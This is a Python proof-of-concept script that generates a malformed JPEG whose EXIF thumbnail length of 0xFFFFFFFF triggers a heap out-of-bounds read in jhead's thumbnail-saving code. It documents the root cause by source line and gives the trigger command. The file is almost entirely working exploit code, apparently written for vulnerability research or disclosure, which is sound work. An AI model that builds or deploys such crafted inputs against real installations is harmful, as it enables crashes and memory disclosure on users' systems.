#!/usr/bin/env python3
"""
PoC generator for jhead VULN 001:
Heap OOB Read via Negative ThumbnailSize Sign Error in SaveImgThumbnail()

Root cause:
  - ThumbnailSize is `int` (exif.c:491, jhead.h:130).
  - TAG_THUMBNAIL_LENGTH = 0xFFFFFFFF:
      exif.c:863: ThumbnailSize = (unsigned)ConvertAnyFormat(...) -> int -1
  - exif.c:982 bounds check (signed): -1 > (ExifLength - ThumbnailOffset)
      -> FALSE (since ExifLength - ThumbnailOffset is positive)
      -> clamp is skipped; ImageInfo.ThumbnailSize = -1
  - imgfile.c:334: checks == 0, not <= 0; -1 passes through
  - imgfile.c:365: fwrite(ptr, (size_t)(-1), 1, file) -> SIZE_MAX OOB read

Trigger: jhead -st <output> vuln_001_input.jpg
"""

import struct
import os

OUT_FILE = "vuln_001_input.jpg"

# -------------------------------------------------------------------------
# TIFF data (little-endian) layout (offsets relative to TIFF base)
# -------------------------------------------------------------------------
# [0x00] TIFF header (8 bytes): 'II', magic=42, IFD0_offset=8
# [0x08] IFD0: count=1, entry IMAGE_WIDTH=100, next_ifd=IFD1_offset
# [0x1A] IFD1: count=2, THUMBNAIL_OFFSET=8, THUMBNAIL_LENGTH=0xFFFFFFFF, next=0
# -------------------------------------------------------------------------

TAG_IMAGE_WIDTH      = 0x0100  # dummy IFD0 entry
TAG_THUMBNAIL_OFFSET = 0x0201
TAG_THUMBNAIL_LENGTH = 0x0202
FMT_ULONG            = 4       # TIFF type: unsigned 32-bit int

IFD0_OFFSET     = 8
IFD0_NUM_ENTRIES = 1
# IFD0 size = 2 (count) + 1*12 (entries) + 4 (next_ptr) = 18 bytes
IFD1_OFFSET     = IFD0_OFFSET + 2 + IFD0_NUM_ENTRIES * 12 + 4  # = 26 = 0x1A

# Thumbnail offset in TIFF coordinates: point inside the TIFF block.
# Must satisfy exif.c:981: ThumbnailOffset <= ExifLength
THUMBNAIL_OFFSET_VALUE = 8       # offset 8 = IFD0 start (well within TIFF)
THUMBNAIL_LENGTH_VALUE = 0xFFFFFFFF  # stored as int -> -1

def ifd_entry(tag, fmt, count, value):
    return struct.pack('<HHII', tag, fmt, count, value)

# TIFF header
tiff  = struct.pack('<2sHI', b'II', 42, IFD0_OFFSET)
# IFD0
tiff += struct.pack('<H', IFD0_NUM_ENTRIES)
tiff += ifd_entry(TAG_IMAGE_WIDTH, FMT_ULONG, 1, 100)
tiff += struct.pack('<I', IFD1_OFFSET)
# IFD1
tiff += struct.pack('<H', 2)
tiff += ifd_entry(TAG_THUMBNAIL_OFFSET, FMT_ULONG, 1, THUMBNAIL_OFFSET_VALUE)
tiff += ifd_entry(TAG_THUMBNAIL_LENGTH, FMT_ULONG, 1, THUMBNAIL_LENGTH_VALUE)
tiff += struct.pack('<I', 0)  # no next IFD

# ExifLength = len(tiff) = 56
# ThumbnailOffset = 8, ExifLength - ThumbnailOffset = 48
# signed check: -1 > 48 -> FALSE -> clamp skipped
# ImageInfo.ThumbnailSize = -1
# fwrite(ptr, SIZE_MAX, 1, file) -> ASAN heap-buffer-overflow

# -------------------------------------------------------------------------
# APP1 segment: marker FF E1 + 2-byte length + "Exif\x00\x00" + TIFF
# The length field includes its own 2 bytes.
# -------------------------------------------------------------------------
exif_magic  = b'Exif\x00\x00'
app1_body   = exif_magic + tiff
app1_length = 2 + len(app1_body)  # includes the 2-byte length field itself
app1        = b'\xFF\xE1' + struct.pack('>H', app1_length) + app1_body

# -------------------------------------------------------------------------
# Minimal JPEG: SOI + APP1 + SOS (so jhead stops reading cleanly)
# jhead's ReadJpegSections loop terminates when it hits M_SOS (0xDA).
# EOI (FF D9) has no length field and would cause "Unexpected end of file".
# A minimal SOS scan header:
#   FF DA        (marker)
#   00 08        (length = 8, includes itself)
#   01           (Ns = 1 component)
#   01 00        (Cs=1, Td/Ta=0)
#   00 3F 00     (Ss=0, Se=63, Ah/Al=0)
# -------------------------------------------------------------------------
sos_header = b'\x01\x01\x00\x00\x3F\x00'  # 6 bytes of scan header data
sos_length = 2 + len(sos_header)            # = 8
sos         = b'\xFF\xDA' + struct.pack('>H', sos_length) + sos_header

# Compressed image payload after SOS (required to avoid EOF issues in some
# jhead paths; a few dummy bytes suffice since READ_IMAGE is not set for -st)
compressed_stub = b'\x00' * 16

jpeg = b'\xFF\xD8' + app1 + sos + compressed_stub + b'\xFF\xD9'

out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), OUT_FILE)
with open(out_path, 'wb') as f:
    f.write(jpeg)

print(f"[+] Written {len(jpeg)} bytes to {out_path}")
print(f"    TIFF size (ExifLength) : {len(tiff)} bytes")
print(f"    IFD0 at TIFF offset    : {IFD0_OFFSET}")
print(f"    IFD1 at TIFF offset    : {IFD1_OFFSET}")
print(f"    TAG_THUMBNAIL_OFFSET   : {THUMBNAIL_OFFSET_VALUE} (0x{THUMBNAIL_OFFSET_VALUE:x})")
print(f"    TAG_THUMBNAIL_LENGTH   : 0x{THUMBNAIL_LENGTH_VALUE:x}  -> signed int -1 -> size_t SIZE_MAX")
print(f"    Bounds check -1 > {len(tiff) - THUMBNAIL_OFFSET_VALUE}: FALSE -> no clamp")
